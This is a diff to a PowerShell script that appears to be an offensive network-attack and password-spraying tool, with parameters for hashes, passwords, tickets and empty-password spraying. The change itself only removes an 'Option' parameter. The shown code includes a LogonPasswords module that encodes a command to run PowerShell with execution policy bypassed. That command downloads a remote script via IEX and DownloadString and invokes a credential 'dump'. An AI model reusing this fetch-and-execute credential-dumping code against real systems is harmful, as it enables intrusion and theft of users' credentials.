@@ -25,51 +25,48 @@ Param(
     [String]$Hash = "",
 
     [Parameter(Mandatory=$False, Position=7, ValueFromPipeline=$true)]
-    [String]$Option = "",
-
-    [Parameter(Mandatory=$False, Position=8, ValueFromPipeline=$true)]
     [String]$Password = "",
 
-    [Parameter(Mandatory=$False, Position=9, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=8, ValueFromPipeline=$true)]
     [String]$AllDomains = "",
 
-    [Parameter(Mandatory=$False, Position=10, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=9, ValueFromPipeline=$true)]
     [String]$UserDomain = "",
 
-    [Parameter(Mandatory=$False, Position=11, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=10, ValueFromPipeline=$true)]
     [String]$LocalFileServer = "",
 
-    [Parameter(Mandatory=$False, Position=12, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=11, ValueFromPipeline=$true)]
     [String]$Threads = "8",
 
-    [Parameter(Mandatory=$False, Position=13, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=12, ValueFromPipeline=$true)]
     [switch]$Force,
 
-    [Parameter(Mandatory=$False, Position=14, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=13, ValueFromPipeline=$true)]
     [switch]$LocalAuth,
     
-    [Parameter(Mandatory=$False, Position=15, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=14, ValueFromPipeline=$true)]
     [switch]$CurrentUser,
 
-    [Parameter(Mandatory=$False, Position=16, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=15, ValueFromPipeline=$true)]
     [switch]$SuccessOnly,
 
-    [Parameter(Mandatory=$False, Position=17, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=16, ValueFromPipeline=$true)]
     [switch]$ShowOutput,
 
-    [Parameter(Mandatory=$False, Position=18, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=17, ValueFromPipeline=$true)]
     [String]$Ticket = "",
 
-    [Parameter(Mandatory=$False, Position=19, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=18, ValueFromPipeline=$true)]
     [Switch]$AccountAsPassword,
 
-    [Parameter(Mandatory=$False, Position=20, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=19, ValueFromPipeline=$true)]
     [Switch]$EmptyPassword,
 
-    [Parameter(Mandatory=$False, Position=21, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=20, ValueFromPipeline=$true)]
     [int]$Port = "",
 
-    [Parameter(Mandatory=$False, Position=22, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=21, ValueFromPipeline=$true)]
     [Switch]$NoParse
 )
 
@@ -1028,7 +1025,7 @@ $Command = "powershell.exe -ep bypass -enc $base64command"
 }
 
 # LogonPasswords
-elseif (($Module -eq "LogonPasswords") -or ($Module -eq "LogonPasswords" -and $Option -eq "Parse")){
+elseif ($Module -eq "LogonPasswords"){
 $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""dump"""
 $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
 $Command = "powershell.exe -ep bypass -enc $base64command"
@@ -1096,7 +1093,7 @@ $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicod
 $Command = "powershell.exe -ep bypass -enc $base64command"
 }
 
-elseif ($Module -eq "" -and $Option -eq "" -and $Command -ne ""){
+elseif ($Module -eq "" -and $Command -ne ""){
 $base64Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
 $Command = "powershell.exe -ep bypass -enc $base64Command"
 }
@@ -3599,11 +3596,6 @@ Write-Host "Both -AccountAsPassword and -EmptyPassword provided"
 return
 }
 
-if ($Option -ne ""){
-Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-Write-Host "Option is not a valid parameter for spraying"
-return
-}
     
 
             
